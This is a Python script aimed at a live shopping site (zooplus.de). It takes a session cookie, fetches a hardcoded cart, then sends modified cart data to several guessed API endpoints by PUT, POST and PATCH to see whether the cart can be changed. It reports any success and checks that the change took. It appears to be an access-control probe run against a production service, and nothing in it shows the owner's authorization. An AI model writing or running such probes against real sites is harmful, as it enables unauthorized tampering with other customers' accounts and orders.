#!/usr/bin/env python3
"""
Test modification using cartId instead of UUID
"""

import requests
import json
import sys
import copy

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_modify_cartid.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Get cart
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
cart = r.json()
cart_id = cart.get("cartId")
before_count = len(cart.get("articles", []))
before_total = cart.get("summary", {}).get("grandTotal", 0)

print(f"[*] Testing with cartId: {cart_id}")
print(f"[+] Cart before: {before_count} items, {before_total} EUR")
print()

# Test with cartId
cart_modified = copy.deepcopy(cart)
cart_modified["articles"] = cart_modified["articles"][1:]  # Remove first

tests = [
    # Using cartId
    ("PUT", f"/checkout/api/cart-api/v2/cart/{cart_id}", cart_modified),
    ("POST", f"/checkout/api/cart-api/v2/cart/{cart_id}", cart_modified),
    ("PATCH", f"/checkout/api/cart-api/v2/cart/{cart_id}", {"articles": cart_modified["articles"]}),
    
    # Using cartId with update endpoint
    ("POST", f"/checkout/api/cart-api/v2/cart/{cart_id}/update", cart_modified),
    ("PUT", f"/checkout/api/cart-api/v2/cart/{cart_id}/update", cart_modified),
    
    # Try state API with cartId
    ("POST", f"/checkout/api/cart-state-api/v2/cart/{cart_id}", cart_modified),
    ("PUT", f"/checkout/api/cart-state-api/v2/cart/{cart_id}", cart_modified),
    
    # Try v1 with cartId
    ("POST", f"/checkout/api/cart-api/v1/cart/{cart_id}", cart_modified),
    ("PUT", f"/checkout/api/cart-api/v1/cart/{cart_id}", cart_modified),
]

for method, endpoint, payload in tests:
    print(f"[*] {method} {endpoint}")
    try:
        if method == "PUT":
            r = requests.put(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        elif method == "PATCH":
            r = requests.patch(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        else:
            r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload, timeout=10)
        
        print(f"    HTTP {r.status_code}")
        
        if r.status_code in [200, 204]:
            print(f"    [!!!] SUCCESS!")
            print(f"    Response: {r.text[:300]}")
            
            # Verify
            r2 = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
            if r2.status_code == 200:
                cart_after = r2.json()
                after_count = len(cart_after.get("articles", []))
                if after_count != before_count:
                    print(f"    [!!!] VERIFIED: Cart modified! {before_count} -> {after_count} items")
                    break
        elif r.status_code == 400:
            print(f"    [!] Bad Request: {r.text[:200]}")
        elif r.status_code not in [404, 405]:
            print(f"    Response: {r.text[:200]}")
    except Exception as e:
        print(f"    Error: {e}")

print()
print("[*] Final verification...")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    print(f"[+] Cart after: {after_count} items, {after_total} EUR")
    
    if before_count != after_count:
        print()
        print("[!!!] CART MODIFIED!")

